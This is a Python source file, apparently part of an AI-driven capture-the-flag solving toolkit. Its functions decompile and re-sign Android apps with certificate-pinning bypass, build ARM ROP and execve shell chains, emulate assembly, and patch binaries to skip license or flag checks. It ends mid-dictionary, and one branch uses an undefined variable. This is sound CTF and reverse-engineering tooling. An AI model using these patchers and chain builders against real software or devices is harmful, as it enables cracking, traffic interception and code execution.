    ('Hardcoded key', r'AES|DES|MD5|SHA.*=.*"[A-Za-z0-9+/]{16,}"'),
    ('External storage', r'getExternalStorage|WRITE_EXTERNAL_STORAGE'),
    ('Log sensitive', r'Log\\.[deiw].*(?:password|secret|token|key)'),
    ('World readable', r'MODE_WORLD_READABLE|MODE_WORLD_WRITEABLE'),
]
for smali in smali_files[:100]:
    if not smali or not os.path.exists(smali): continue
    content = open(smali).read()
    for name, pattern in danger_patterns:
        if re.search(pattern, content, re.IGNORECASE):
            print(f"[!] {{name}} in {{smali.split('/')[-1]}}")
            break
"""
        return tool_execute_python(code, timeout=90)

    if operation == "dex":
        return _shell(f"unzip -p '{ap}' 'classes.dex' > /tmp/classes.dex 2>/dev/null && "
                     f"dexdump -d /tmp/classes.dex 2>/dev/null | head -80 || "
                     f"baksmali d /tmp/classes.dex -o /tmp/smali_out 2>/dev/null && "
                     f"find /tmp/smali_out -name '*.smali' | head -10 && "
                     f"head -40 /tmp/smali_out/*/*.smali 2>/dev/null",
                     timeout=30)

    if operation == "all":
        return (f"=== APK Quick Analysis: {ap} ===\n\n" +
                _shell(f"file '{ap}'; echo '---'; aapt dump badging '{ap}' 2>/dev/null | head -10; "
                      f"echo '---'; unzip -l '{ap}' | head -20; "
                      f"echo '--- Permissions ---'; aapt dump permissions '{ap}' 2>/dev/null | head -20; "
                      f"echo '--- Strings sample ---'; "
                      f"unzip -p '{ap}' classes.dex 2>/dev/null | strings | grep -iE 'http|secret|key|flag' | head -15",
                      timeout=30))

    return "Operations: all, manifest, decompile, strings, certificate, find_vulns, dex, smali"


def tool_apk_resign(apk_path: str, operation: str = "full_pipeline",
                     patch_smali: str = "", target_class: str = "",
                     output_path: str = "") -> str:
    """Full APK patch → rebuild → sign → install pipeline.
    Ops: full_pipeline (decompile → patch → rebuild → sign → install),
    decompile (apktool d), rebuild (apktool b + sign), sign (jarsigner + zipalign),
    install (adb install), patch_ssl (auto-patch network_security_config for traffic intercept)."""

    ap = _w2l(apk_path) if (IS_WINDOWS and USE_WSL) else apk_path
    work_dir = f"/tmp/apk_resign_{int(time.time())}"
    out_apk = output_path or ap.replace('.apk', '_patched.apk')
    keystore = "/tmp/ctf_debug.keystore"

    if operation in ("full_pipeline", "decompile"):
        decompile = _shell(f"mkdir -p '{work_dir}' && "
                          f"apktool d '{ap}' -o '{work_dir}' -f 2>&1 | tail -5 && "
                          f"echo 'Decompiled to: {work_dir}' && ls '{work_dir}'",
                          timeout=60)
        if operation == "decompile":
            return decompile

    if operation in ("full_pipeline", "patch_ssl"):
        # Auto-patch network_security_config
        nsc_dir = f"{work_dir}/res/xml"
        nsc = (_shell(f"mkdir -p '{nsc_dir}' && "
                     f"cat > '{nsc_dir}/network_security_config.xml' << 'EOF'\n"
                     f"<?xml version=\"1.0\" encoding=\"utf-8\"?>\n"
                     f"<network-security-config>\n"
                     f"  <base-config cleartextTrafficPermitted=\"true\">\n"
                     f"    <trust-anchors>\n"
                     f"      <certificates src=\"system\"/>\n"
                     f"      <certificates src=\"user\"/>\n"
                     f"    </trust-anchors>\n"
                     f"  </base-config>\n"
                     f"</network-security-config>\nEOF\n"
                     f"echo 'NSC patched'", timeout=5) +
               _shell(f"grep -l 'android:networkSecurityConfig' '{work_dir}/AndroidManifest.xml' 2>/dev/null || "
                     f"sed -i 's/<application/& android:networkSecurityConfig=\"@xml\\/network_security_config\"/' "
                     f"'{work_dir}/AndroidManifest.xml' 2>/dev/null && "
                     f"echo 'AndroidManifest.xml patched'", timeout=5))
        if operation == "patch_ssl":
            return nsc + f"\nWork dir: {work_dir}\nRun operation='rebuild' to build the patched APK"

    if patch_smali and target_class:
        # Apply custom smali patch
        class_file = target_class.replace('.', '/') + '.smali'
        smali_path = f"{work_dir}/smali/{class_file}"
        _shell(f"echo {repr(patch_smali)} >> '{smali_path}' 2>/dev/null", timeout=5)

    if operation in ("full_pipeline", "rebuild", "sign"):
        # Rebuild
        rebuilt_apk = f"{work_dir}/dist/{__import__('os').path.basename(ap)}"
        rebuild = _shell(f"apktool b '{work_dir}' -o '{work_dir}/dist/patched.apk' 2>&1 | tail -10",
                        timeout=120)

        # Generate debug keystore if needed
        _shell(f"[ -f '{keystore}' ] || keytool -genkey -v -keystore '{keystore}' "
              f"-alias ctf -keyalg RSA -keysize 2048 -validity 365 "
              f"-storepass ctfpass123 -keypass ctfpass123 "
              f"-dname 'CN=CTF,OU=CTF,O=CTF,L=CTF,S=CTF,C=US' 2>/dev/null", timeout=20)

        # Sign
        sign = _shell(f"jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 "
                     f"-keystore '{keystore}' -storepass ctfpass123 -keypass ctfpass123 "
                     f"'{work_dir}/dist/patched.apk' ctf 2>&1 | tail -5 && "
                     f"zipalign -v 4 '{work_dir}/dist/patched.apk' '{out_apk}' 2>&1 | tail -3 && "
                     f"echo 'Output APK: {out_apk}'",
                     timeout=30)

        if operation == "sign":
            return sign

        if operation in ("full_pipeline", "install"):
            install = _shell(f"adb install -r '{out_apk}' 2>&1", timeout=30)
            return rebuild + sign + install

        return rebuild + sign

    if operation == "install":
        return _shell(f"adb install -r '{ap}' 2>&1", timeout=30)

    return "Operations: full_pipeline, decompile, patch_ssl, rebuild, sign, install"


def tool_arm_rop(binary_path: str, operation: str = "chain",
                  libc_path: str = "", arch: str = "arm64",
                  goal: str = "shell", base_addr: str = "0") -> str:
    """ARM/MIPS/AArch64 ROP chain builder.
    Ops: chain (build full ROP chain for goal), gadgets (dump useful gadgets),
    checksec (protections), ret2libc (find system + /bin/sh in libc),
    syscall (build execve syscall chain for target arch)."""

    sp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path
    lp = (_w2l(libc_path) if (IS_WINDOWS and USE_WSL) else libc_path) if libc_path else ""
    base = int(base_addr, 16) if base_addr.startswith('0x') else int(base_addr)

    if operation == "checksec":
        return _shell(f"checksec --file='{sp}' 2>/dev/null && file '{sp}'", timeout=10)

    if operation == "gadgets":
        arch_lower = arch.lower()
        if arch_lower in ("arm64", "aarch64"):
            return _shell(f"ROPgadget --binary '{sp}' --arch arm64 2>/dev/null | head -60 || "
                         f"ropper -f '{sp}' --arch AARCH64 2>/dev/null | head -60",
                         timeout=30)
        elif arch_lower == "arm":
            return _shell(f"ROPgadget --binary '{sp}' --arch arm 2>/dev/null | head -60 || "
                         f"ropper -f '{sp}' --arch ARM 2>/dev/null | head -60",
                         timeout=30)
        elif arch_lower in ("mips", "mipsel"):
            return _shell(f"ROPgadget --binary '{sp}' --arch mips 2>/dev/null | head -60 || "
                         f"ropper -f '{sp}' --arch MIPS 2>/dev/null | head -60",
                         timeout=30)

    code = f"""
try:
    from pwn import *
    context.log_level = 'error'
    elf = ELF({repr(sp)}, checksec=False)
    arch = {repr(arch.lower())}
    context.arch = arch if arch != 'arm64' else 'aarch64'
    base = {base}
    goal = {repr(goal)}
    lp = {repr(lp)}
    libc = ELF(lp, checksec=False) if lp else None

    rop = ROP(elf)
    print(f"Architecture: {{context.arch}}")
    print(f"Binary base: 0x{{base:x}}")

    if goal in ('shell', 'ret2libc') and libc:
        system = libc.sym.get('system', 0) + base
        binsh  = next(libc.search(b'/bin/sh'), 0) + base if libc else 0
        print(f"system @ 0x{{system:x}}")
        print(f"/bin/sh @ 0x{{binsh:x}}")

        if context.arch in ('aarch64', 'arm'):
            # ARM/AArch64: first arg in x0/r0
            gadgets = rop.gadgets
            pop_x0 = None
            for g in gadgets.values():
                if context.arch == 'aarch64' and 'x0' in str(g) and 'ret' in str(g).lower():
                    pop_x0 = g
                    break

            print("\\nAArch64 ROP chain skeleton (pwntools):")
            print(f"  # Need gadget: pop x0 (or x0, x1, ...) ; ret (or br x...)")
            print(f"  rop.call(0x{{system:x}}, [0x{{binsh:x}}])")
            print(f"  chain = rop.chain()")

    if goal in ('syscall', 'execve'):
        if context.arch == 'aarch64':
            print("\\nAArch64 execve syscall chain:")
            print("  x8 = 221 (execve syscall number)")
            print("  x0 = /bin/sh address")
            print("  x1 = 0 (argv)")
            print("  x2 = 0 (envp)")
            print("  svc #0")
            print("  Gadgets needed: pop x8; ret, pop x0; ret, svc #0; ret")
        elif context.arch == 'arm':
            print("\\nARM execve syscall chain:")
            print("  r7 = 11 (execve syscall number)")
            print("  r0 = /bin/sh address")
            print("  r1 = 0, r2 = 0")
            print("  swi #0 (or svc #0)")

    # Dump available gadgets
    print("\\nAvailable gadgets (top 20):")
    for addr, g in list(rop.gadgets.items())[:20]:
        print(f"  0x{{addr+base:x}}: {{g}}")

except ImportError:
    print("pwntools not available for ARM ROP")
    print(f"Manual approach: ROPgadget --binary '{sp}' --arch {arch}")
except Exception as ex:
    import traceback; traceback.print_exc()
"""
    return tool_execute_python(code, timeout=30)


def tool_asm_eval(code_or_path: str, operation: str = "eval",
                   arch: str = "x86_64", entry: str = "",
                   inputs: dict = None, steps: int = 0) -> str:
    """Evaluate/trace assembly code to compute register state.
    Critical for asm1-asm4 type challenges where you need the return value.
    Ops: eval (run snippet, dump final registers), trace (step-by-step with state),
    find_ret (find what value gets returned), decompile_snippet (lift to C-like pseudocode)."""

    arch_map = {
        "x86":    ("UC_ARCH_X86",  "UC_MODE_32",   "x86"),
        "x86_64": ("UC_ARCH_X86",  "UC_MODE_64",   "x86_64"),
        "arm":    ("UC_ARCH_ARM",  "UC_MODE_ARM",  "arm"),
        "arm64":  ("UC_ARCH_ARM64","UC_MODE_ARM",  "arm64"),
        "mips":   ("UC_ARCH_MIPS", "UC_MODE_MIPS32","mips"),
    }
    ua, um, uarch = arch_map.get(arch.lower(), arch_map["x86_64"])

    if operation in ("eval", "trace", "find_ret"):
        regs_init = inputs or {}
        code_py = f"""
import sys
asm_text = {repr(code_or_path)}
arch = {repr(arch.lower())}
op = {repr(operation)}
entry = {repr(entry)}
init_regs = {repr(regs_init)}
max_steps = {steps or 1000}

# Try keystone + unicorn approach
try:
    import keystone as ks
    import unicorn as uc
    import unicorn.x86_const as x86c
    import unicorn.arm_const as armc

    # Assemble
    arch_ks = {{
        'x86':    (ks.KS_ARCH_X86,   ks.KS_MODE_32),
        'x86_64': (ks.KS_ARCH_X86,   ks.KS_MODE_64),
        'arm':    (ks.KS_ARCH_ARM,   ks.KS_MODE_ARM),
        'arm64':  (ks.KS_ARCH_ARM64, ks.KS_MODE_ARM),
        'mips':   (ks.KS_ARCH_MIPS,  ks.KS_MODE_MIPS32),
    }}
    ks_arch, ks_mode = arch_ks.get(arch, arch_ks['x86_64'])

    # If it looks like hex shellcode, skip assembly
    import re
    if re.match(r'^[0-9a-fA-F\\s]+$', asm_text.strip()):
        bytecode = bytes.fromhex(asm_text.replace(' ','').replace('\\n',''))
    else:
        assembler = ks.Ks(ks_arch, ks_mode)
        bytecode, _ = assembler.asm(asm_text)
        bytecode = bytes(bytecode)

    # Emulate
    arch_uc = {{
        'x86':    (uc.UC_ARCH_X86,   uc.UC_MODE_32),
        'x86_64': (uc.UC_ARCH_X86,   uc.UC_MODE_64),
        'arm':    (uc.UC_ARCH_ARM,   uc.UC_MODE_ARM),
        'arm64':  (uc.UC_ARCH_ARM64, uc.UC_MODE_ARM),
        'mips':   (uc.UC_ARCH_MIPS,  uc.UC_MODE_MIPS32),
    }}
    uc_arch, uc_mode = arch_uc.get(arch, arch_uc['x86_64'])
    mu = uc.Uc(uc_arch, uc_mode)

    BASE = 0x400000
    STACK = 0x7fff0000
    mu.mem_map(BASE, 2*1024*1024)
    mu.mem_map(STACK - 0x10000, 0x20000)
    mu.mem_write(BASE, bytecode)

    # Set up stack and registers
    if arch == 'x86_64':
        mu.reg_write(x86c.UC_X86_REG_RSP, STACK)
        mu.reg_write(x86c.UC_X86_REG_RBP, STACK)
        for reg_name, val in init_regs.items():
            reg_map = {{'rdi':x86c.UC_X86_REG_RDI,'rsi':x86c.UC_X86_REG_RSI,
                        'rdx':x86c.UC_X86_REG_RDX,'rcx':x86c.UC_X86_REG_RCX,
                        'rax':x86c.UC_X86_REG_RAX,'rbx':x86c.UC_X86_REG_RBX,
                        'r8':x86c.UC_X86_REG_R8,'r9':x86c.UC_X86_REG_R9}}
            if reg_name.lower() in reg_map:
                mu.reg_write(reg_map[reg_name.lower()], val)
    elif arch == 'x86':
        mu.reg_write(x86c.UC_X86_REG_ESP, STACK)
        for reg_name, val in init_regs.items():
            reg_map = {{'eax':x86c.UC_X86_REG_EAX,'ebx':x86c.UC_X86_REG_EBX,
                        'ecx':x86c.UC_X86_REG_ECX,'edx':x86c.UC_X86_REG_EDX,
                        'edi':x86c.UC_X86_REG_EDI,'esi':x86c.UC_X86_REG_ESI}}
            if reg_name.lower() in reg_map:
                mu.reg_write(reg_map[reg_name.lower()], val)

    trace_log = []
    if op == 'trace':
        import unicorn as uc2
        def hook_insn(mu2, address, size, user_data):
            if arch == 'x86_64':
                rax = mu2.reg_read(x86c.UC_X86_REG_RAX)
                rbx = mu2.reg_read(x86c.UC_X86_REG_RBX)
                rcx = mu2.reg_read(x86c.UC_X86_REG_RCX)
                rdx = mu2.reg_read(x86c.UC_X86_REG_RDX)
                trace_log.append(f"  0x{{address:x}}: rax=0x{{rax:x}} rbx=0x{{rbx:x}} rcx=0x{{rcx:x}} rdx=0x{{rdx:x}}")
            if len(trace_log) >= max_steps: mu2.emu_stop()
        mu.hook_add(uc.UC_HOOK_CODE, hook_insn)

    try:
        mu.emu_start(BASE, BASE + len(bytecode), timeout=5*1000*1000, count=max_steps)
    except uc.UcError as e:
        pass  # Normal exit on ret/hlt

    # Dump final register state
    if arch == 'x86_64':
        regs = {{
            'rax': mu.reg_read(x86c.UC_X86_REG_RAX),
            'rbx': mu.reg_read(x86c.UC_X86_REG_RBX),
            'rcx': mu.reg_read(x86c.UC_X86_REG_RCX),
            'rdx': mu.reg_read(x86c.UC_X86_REG_RDX),
            'rdi': mu.reg_read(x86c.UC_X86_REG_RDI),
            'rsi': mu.reg_read(x86c.UC_X86_REG_RSI),
        }}
    elif arch == 'x86':
        regs = {{
            'eax': mu.reg_read(x86c.UC_X86_REG_EAX),
            'ebx': mu.reg_read(x86c.UC_X86_REG_EBX),
            'ecx': mu.reg_read(x86c.UC_X86_REG_ECX),
            'edx': mu.reg_read(x86c.UC_X86_REG_EDX),
        }}
    else:
        regs = {{'r0': 0}}

    print("Final register state:")
    for r, v in regs.items():
        print(f"  {{r}} = 0x{{v:016x}} ({{v}}, chr={{chr(v & 0x7f) if 32<=v&0x7f<=126 else '?'}})")

    if op == 'find_ret':
        ret_val = regs.get('rax', regs.get('eax', 0))
        print(f"\\nReturn value (rax/eax): 0x{{ret_val:x}} = {{ret_val}}")

    if trace_log:
        print("\\nExecution trace (first/last 10):")
        for l in (trace_log[:10] + ['...'] + trace_log[-10:] if len(trace_log)>20 else trace_log):
            print(l)

except ImportError:
    # Fallback: pure Python x86 mini-evaluator for simple ALU ops
    print("keystone/unicorn not available — using Python mini-evaluator")
    import re
    regs = {{'eax':0,'ebx':0,'ecx':0,'edx':0,'edi':0,'esi':0,'esp':0xffff0,'ebp':0xffff0}}
    regs.update({{k.lower():v for k,v in init_regs.items()}})

    def parse_val(s, regs):
        s = s.strip()
        if s.startswith('0x'): return int(s,16)
        if s.lstrip('-').isdigit(): return int(s)
        return regs.get(s.lower(), 0)

    lines = [l.strip() for l in asm_text.split('\\n') if l.strip() and not l.strip().startswith(';')]
    for line in lines[:100]:
        line = re.sub(r';.*','', line).strip()
        if not line: continue
        m = re.match(r'(\\w+)\\s+(\\w+)\\s*,\\s*(.+)', line)
        if not m: continue
        op2, dst, src_s = m.group(1).lower(), m.group(2).lower(), m.group(3)
        src_v = parse_val(src_s, regs)
        if op2 == 'mov': regs[dst] = src_v
        elif op2 == 'add': regs[dst] = (regs.get(dst,0) + src_v) & 0xffffffff
        elif op2 == 'sub': regs[dst] = (regs.get(dst,0) - src_v) & 0xffffffff
        elif op2 == 'imul': regs[dst] = (regs.get(dst,0) * src_v) & 0xffffffff
        elif op2 == 'xor': regs[dst] = regs.get(dst,0) ^ src_v
        elif op2 == 'and': regs[dst] = regs.get(dst,0) & src_v
        elif op2 == 'or':  regs[dst] = regs.get(dst,0) | src_v
        elif op2 == 'shl': regs[dst] = (regs.get(dst,0) << (src_v&31)) & 0xffffffff
        elif op2 == 'shr': regs[dst] = regs.get(dst,0) >> (src_v&31)
        elif op2 == 'sar': regs[dst] = regs.get(dst,0) >> (src_v&31)
        elif op2 in ('lea','cmp','test'): pass
    print("Register state (Python mini-evaluator):")
    for r,v in regs.items():
        if v: print(f"  {{r}} = 0x{{v:x}} = {{v}}")
    print(f"Return value guess (eax): 0x{{regs.get('eax',0):x}}")
"""
        return tool_execute_python(code_py, timeout=20)

    if operation == "decompile_snippet":
        # Use retdec or r2 to lift to pseudocode
        if source_path:
            sp = _w2l(source_path) if (IS_WINDOWS and USE_WSL) else source_path
            return _shell(f"r2 -q -c 'aaa; s {entry or 'main'}; pdf' '{sp}' 2>/dev/null | head -60 || "
                         f"objdump -M intel -d '{sp}' | head -80", timeout=20)
        return "Provide source_path for decompile_snippet"

    return "Operations: eval, trace, find_ret, decompile_snippet"


def tool_binary_patch(binary_path: str, operation: str = "nop",
                       offset: str = "0", size: int = 1,
                       new_bytes: str = "", output_path: str = "",
                       function_name: str = "", condition: str = "") -> str:
    """Instruction-level binary patching for reversing challenges.
    Ops: nop (NOP out bytes at offset), flip_jump (jz↔jnz, ja↔jbe etc),
    patch_bytes (write arbitrary hex at offset), patch_ret (make function return constant),
    find_checks (find cmp+jne patterns that look like license/flag checks),
    assemble (assemble instruction and write at offset), info (offsets of function)."""

    sp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path
    out = output_path or sp + ".patched"

    if operation == "find_checks":
        code = f"""
import subprocess, re
sp = {repr(sp)}
r = subprocess.run(['objdump', '-M', 'intel', '-d', sp],
                   capture_output=True, text=True, timeout=30)
lines = r.stdout.split('\\n')
results = []
for i, line in enumerate(lines):
    # Look for cmp followed by jne/je/jz/jnz within 3 instructions
    if re.search(r'\\bcmp\\b|\\btest\\b', line):
        context = lines[i:i+4]
        for jl in context[1:]:
            if re.search(r'\\bjne\\b|\\bjnz\\b|\\bje\\b|\\bjz\\b|\\bjg\\b|\\bjl\\b', jl):
                addr_m = re.match(r'\\s+([0-9a-f]+):', line)
                if addr_m:
                    results.append(f"Check at 0x{{addr_m.group(1)}}:")
                    results.extend([f"  {{l.strip()}}" for l in context[:4]])
                break
print(f"Found {{len(results)//5}} comparison checks:")
for r in results[:50]: print(r)
"""
        return tool_execute_python(code, timeout=20)

    if operation == "nop":
        off = int(offset, 16) if offset.startswith('0x') else int(offset)
        code = f"""
import shutil, os
sp, out = {repr(sp)}, {repr(out)}
off, size = {off}, {size}
shutil.copy(sp, out)
with open(out, 'r+b') as f:
    f.seek(off)
    f.write(b'\\x90' * size)
print(f"NOPed {{size}} bytes at offset 0x{{off:x}} in {{out}}")
"""
        return tool_execute_python(code, timeout=10)

    if operation == "flip_jump":
        code = f"""
import shutil, subprocess, re
sp, out, off_s = {repr(sp)}, {repr(out)}, {repr(offset)}
import struct

# JCC opcode flip table
FLIP = {{
    0x74: 0x75, 0x75: 0x74,  # je ↔ jne
    0x7c: 0x7d, 0x7d: 0x7c,  # jl ↔ jge
    0x7e: 0x7f, 0x7f: 0x7e,  # jle ↔ jg
    0x72: 0x73, 0x73: 0x72,  # jb ↔ jae
    0x76: 0x77, 0x77: 0x76,  # jbe ↔ ja
    0x0f: 0x0f,  # handled below for 2-byte
}}
shutil.copy(sp, out)
with open(out, 'r+b') as f:
    off = int(off_s, 16) if off_s.startswith('0x') else int(off_s)
    f.seek(off)
    b = f.read(2)
    if b[0] in FLIP and b[0] != 0x0f:
        f.seek(off)
        new_b = FLIP[b[0]]
        f.write(bytes([new_b]))
        print(f"Flipped 0x{{b[0]:02x}} → 0x{{new_b:02x}} at 0x{{off:x}}")
    elif b[0] == 0x0f:  # 2-byte JCC: 0F 84 ↔ 0F 85 etc
        TWO = {{0x84:0x85, 0x85:0x84, 0x8c:0x8d, 0x8d:0x8c, 0x8e:0x8f, 0x8f:0x8e,
               0x82:0x83, 0x83:0x82, 0x86:0x87, 0x87:0x86}}
        if b[1] in TWO:
            f.seek(off+1)
            new_b = TWO[b[1]]
            f.write(bytes([new_b]))
            print(f"Flipped 0F 0x{{b[1]:02x}} → 0F 0x{{new_b:02x}} at 0x{{off:x}}")
    else:
        print(f"Byte 0x{{b[0]:02x}} is not a JCC — verify offset")
"""
        return tool_execute_python(code, timeout=10)

    if operation == "patch_bytes":
        if not new_bytes:
            return "Provide new_bytes as hex string e.g. '9090EB0A'"
        off = int(offset, 16) if offset.startswith('0x') else int(offset)
        code = f"""
import shutil
sp, out, off, new_hex = {repr(sp)}, {repr(out)}, {off}, {repr(new_bytes.replace(' ',''))}
shutil.copy(sp, out)
patch = bytes.fromhex(new_hex)
with open(out, 'r+b') as f:
    f.seek(off)
    f.write(patch)
print(f"Patched {{len(patch)}} bytes at 0x{{off:x}}: {{new_hex}}")
print(f"Output: {{out}}")
"""
        return tool_execute_python(code, timeout=10)

    if operation == "patch_ret":
        # Make a function always return a specific value
        off = int(offset, 16) if offset.startswith('0x') else int(offset)
        ret_val = new_bytes or "1"
        code = f"""
import shutil
sp, out, off = {repr(sp)}, {repr(out)}, {off}
ret_val = {ret_val}
shutil.copy(sp, out)
# mov eax, N; ret
if ret_val == 0:
    patch = b'\\x31\\xc0\\xc3'  # xor eax,eax; ret
elif ret_val == 1:
    patch = b'\\x31\\xc0\\xff\\xc0\\xc3'  # xor eax,eax; inc eax; ret
else:
    import struct
    patch = b'\\xb8' + struct.pack('<I', ret_val & 0xffffffff) + b'\\xc3'  # mov eax,N; ret
with open(out, 'r+b') as f:
    f.seek(off)
    f.write(patch)
print(f"Patched function at 0x{{off:x}} to return {{ret_val}}")
"""
        return tool_execute_python(code, timeout=10)

    if operation == "assemble":
        # Assemble instruction string and patch at offset
        if not new_bytes:
            return "Provide new_bytes as assembly string e.g. 'mov eax, 1; ret'"
        off = int(offset, 16) if offset.startswith('0x') else int(offset)
        code = f"""
import shutil
try:
    import keystone as ks
    assembler = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_64)
    encoding, _ = assembler.asm({repr(new_bytes)}, addr={off})
    patch = bytes(encoding)
    print(f"Assembled: {{' '.join(f'{{b:02x}}' for b in patch)}}")

    sp, out, off = {repr(sp)}, {repr(out)}, {off}
    shutil.copy(sp, out)
    with open(out, 'r+b') as f:
        f.seek(off)
        f.write(patch)
    print(f"Patched at 0x{{off:x}} in {{out}}")
except ImportError:
    print("keystone not available. Install: pip install keystone-engine")
    print(f"Manual: objdump to get bytes, then use patch_bytes operation")
"""
        return tool_execute_python(code, timeout=10)

    if operation == "info":
        fn = function_name or "main"
        return _shell(f"nm -n '{sp}' 2>/dev/null | grep -i '{fn}' | head -10 && "
                     f"objdump -t '{sp}' 2>/dev/null | grep -i '{fn}' | head -10 && "
                     f"readelf -s '{sp}' 2>/dev/null | grep -i '{fn}' | head -10",
                     timeout=15)

    return "Operations: find_checks, nop, flip_jump, patch_bytes, patch_ret, assemble, info"


def tool_challenge_classifier(description: str = "", files: list = None,
                                category_hint: str = "",
                                use_api: bool = False) -> str:
    """Predict challenge type, likely techniques, and recommended tools from description + file list.
    Uses keyword/pattern matching (fast, no API) or Claude API (slow, accurate)."""

    # ── Keyword-based classifier (no API needed) ──────────────────────────────
    text = (description + " " + " ".join(files or []) + " " + category_hint).lower()

    SIGNATURES = {
        # PWN
        "tcache_uaf":       (["tcache","use-after-free","uaf","free","double free","chunk"], ["heap"]),
        "stack_bof":        (["overflow","bof","buffer","segfault","stack","ret2","rop"], ["pwn","binary"]),
        "ret2libc":         (["libc","plt","got","system","binsh","/bin/sh","ret2libc"], ["pwn"]),
        "format_string":    (["format string","printf","%s %p","%n","fmt"], ["pwn"]),
        "heap_grooming":    (["largebin","fastbin","unsorted","consolidate","heap spray"], ["pwn","heap"]),
        "kernel_pwn":       (["kernel","lkm","module","ioctl","/dev/","cred","commit_creds"], ["pwn"]),
        "rop_chain":        (["rop","gadget","chain","sigreturn","srop","ret2csu","ret2plt"], ["pwn"]),
        "srop":             (["sigreturn","srop","signal frame","sigframe"], ["pwn"]),
        # CRYPTO
        "rsa_basic":        (["rsa","modulus","exponent","private key","public key","crt","decrypt"], ["crypto"]),
        "ecc":              (["elliptic curve","ecc","ecdsa","secp","weierstrass","montgomery","point"], ["crypto"]),
        "aes_cbc":          (["aes","cbc","padding oracle","pkcs","iv","mode"], ["crypto"]),
        "hash_length_ext":  (["hash length","extension","sha1","sha256","md5","secret prefix"], ["crypto"]),
        "lwe_lattice":      (["lwe","sis","lattice","knapsack","shortest vector","lll","hnf"], ["crypto"]),
        "prng_crack":       (["seed","rand()","random","mersenne","mt19937","prng"], ["crypto"]),
        # WEB
        "sqli":             (["sql injection","sqli","union select","order by","' or","-- -","sleep("], ["web"]),
        "xss":              (["xss","cross-site","script","alert(","onerror","cookie theft"], ["web"]),
        "ssti":             (["template injection","ssti","jinja","twig","freemarker","{{","}}"], ["web"]),
        "ssrf":             (["ssrf","server-side request","internal","169.254","localhost","metadata"], ["web"]),
        "deserialization":  (["deseriali","pickle","unserialize","yaml.load","marshal","ysoserial"], ["web"]),
        "xxe":              (["xxe","xml external","dtd","entity","<!entity","file:///"], ["web"]),
        "jwt_attack":       (["jwt","json web token","none algorithm","hs256","rs256","alg"], ["web"]),
        "path_traversal":   (["path traversal","../","directory traversal","lfi","rfi","include"], ["web"]),
        "race_condition":   (["race condition","toctou","concurrent","limit","double-spend"], ["web","pwn"]),
        # REV
        "vm_escape":        (["vm","bytecode","interpreter","virtual machine","opcode","dispatch"], ["rev"]),
        "obfuscation":      (["obfuscat","packed","upx","ollvm","mba","cff","anti-debug"], ["rev"]),
        "custom_cipher":    (["custom crypto","xor key","encrypt","decrypt","cipher","substitution"], ["rev","crypto"]),
        # FORENSICS
        "steganography":    (["steg","hidden","lsb","wav","png","jpeg","strings","metadata"], ["forensics","misc"]),
        "memory_forensics": (["memory dump","volatility","vmem","memdump","process","memory"], ["forensics"]),
        "pcap_analysis":    (["pcap","wireshark","network","tcp","packet","tls","traffic"], ["forensics"]),
    }

    # Scoring
    scores = {}
    for tech, (keywords, categories) in SIGNATURES.items():
        score = sum(1 for kw in keywords if kw in text)
        # Boost if category matches
        if category_hint.lower() in categories:
            score += 2
        if score > 0:
            scores[tech] = score

    ranked = sorted(scores.items(), key=lambda x: -x[1])

    # Tool recommendations per technique
    TOOL_MAP_RECS = {
        "tcache_uaf":       ["heap_analysis", "binary_analysis", "ghidra_decompile", "libc_lookup"],
        "stack_bof":        ["rop_chain", "binary_analysis", "angr_solve", "ret2dlresolve"],
        "ret2libc":         ["rop_chain", "libc_lookup", "patchelf", "binary_analysis"],
        "format_string":    ["binary_analysis", "angr_solve", "execute_shell"],
        "heap_grooming":    ["heap_analysis", "binary_analysis", "ghidra_decompile"],
        "kernel_pwn":       ["kernel_info", "seccomp_analyze", "binary_analysis"],
        "rop_chain":        ["rop_chain", "binary_analysis", "srop", "ret2dlresolve"],
        "srop":             ["srop", "rop_chain", "binary_analysis"],
        "rsa_basic":        ["crypto_attack", "factordb", "sage_math", "coppersmith"],
        "ecc":              ["ecc_special_attacks", "sage_math", "ecdsa_lattice", "dlog"],
        "aes_cbc":          ["crypto_attack", "aes_gcm_attack", "execute_python"],
        "hash_length_ext":  ["crypto_attack", "execute_shell"],
        "lwe_lattice":      ["lll", "sage_math", "execute_python"],
        "prng_crack":       ["rng_crack", "execute_python"],
        "sqli":             ["sqlmap", "web_attack", "source_audit"],
        "xss":              ["web_attack", "source_audit", "browser_agent"],
        "ssti":             ["ssti_rce", "web_attack", "source_audit"],
        "ssrf":             ["web_attack", "http_request", "source_audit"],
        "deserialization":  ["deserialization_exploit", "source_audit", "web_attack"],
        "xxe":              ["web_attack", "source_audit", "http_request"],
        "jwt_attack":       ["web_attack", "crypto_attack", "source_audit"],
        "path_traversal":   ["web_attack", "ffuf", "source_audit"],
        "race_condition":   ["concurrent_requests", "web_attack", "execute_shell"],
        "vm_escape":        ["custom_cpu_emulate", "ghidra_decompile", "bytecode_disasm"],
        "obfuscation":      ["deobfuscate", "ghidra_decompile", "binary_analysis"],
        "custom_cipher":    ["decode_transform", "statistical_analysis", "z3_solve"],
        "steganography":    ["analyze_file", "execute_shell", "audio_steg"],
        "memory_forensics": ["volatility", "execute_shell"],
        "pcap_analysis":    ["tls_decrypt", "execute_shell"],
    }

    if not ranked:
        fallback = "No strong signal. Suggest: pre_solve_recon → rank_hypotheses"
        if use_api:
            fallback += "\n(API classification unavailable without strong signal)"
        return fallback

    lines = [f"=== Challenge Classifier ===\n"]
    lines.append(f"Top predictions (keyword score):")
    for tech, score in ranked[:5]:
        tools_rec = TOOL_MAP_RECS.get(tech, ["execute_shell", "execute_python"])
        lines.append(f"  [{score:2d}] {tech}")
        lines.append(f"       Recommended tools: {', '.join(tools_rec[:4])}")

    if ranked:
        best_tech = ranked[0][0]
        lines.append(f"\n=== Primary classification: {best_tech} ===")
        lines.append(f"Confidence: {'high' if ranked[0][1] >= 4 else 'medium' if ranked[0][1] >= 2 else 'low'}")

        # Attack narrative
        narratives = {
            "tcache_uaf": "Likely tcache UAF. Check glibc version (libc_lookup), find UAF primitive, forge tcache entry to get arbitrary write, overwrite __free_hook or use_after_free to hijack control flow.",
            "stack_bof": "Stack buffer overflow. Find offset with cyclic(), build ROP chain (rop_chain tool), leak libc base via puts@plt, then ret2libc or execve syscall.",
            "rsa_basic": "RSA challenge. Check n for factordb, small e (e=3 eth root), same n (GCD), Wiener (large d), Coppersmith for partial plaintext/key.",
